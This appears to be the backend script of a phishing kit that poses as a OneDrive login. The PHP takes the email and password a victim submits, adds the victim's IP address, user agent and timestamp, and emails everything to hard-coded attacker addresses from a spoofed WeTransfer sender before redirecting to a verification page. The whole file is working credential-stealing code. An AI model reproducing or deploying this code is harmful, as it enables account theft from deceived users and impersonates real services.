<?
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$userag = $_SERVER['HTTP_USER_AGENT']; 
$date = date('d-m-Y', time());
$time = date('H:i:s', time());
$msg .= "------------------+| One Drive |+------------\n";
$msg .= "Email : ".$_POST['id1']."\n";
$msg .= "Password  : ".$_POST['id2']."\n";
$msg .= "------------------+|  PC INFO   |+------------\n";
$msg .= "IP   : $ip \n";
$msg .= "TIME : ".$time."\n";
$msg .= "DATE : ".$date."\n";
$msg .= "USER : ".$userag."\n";
$msg .= "-----------------------------------------------\n";



$bilsnd = "evilcderinclogz@gmail.com,evilc0der@protonmail.com";
$sub = "Other Login  | $ip ";
$head = "From: wetransfer@support.com";
$head .= "\n";
$arr=array($bilsnd, $IP);
foreach ($arr as $bilsnd)
mail($bilsnd,$sub,$msg,$head,$file);


header("Location: verification.php");
$css = css_while();
$html = html_while($css, "");
die($html);
?>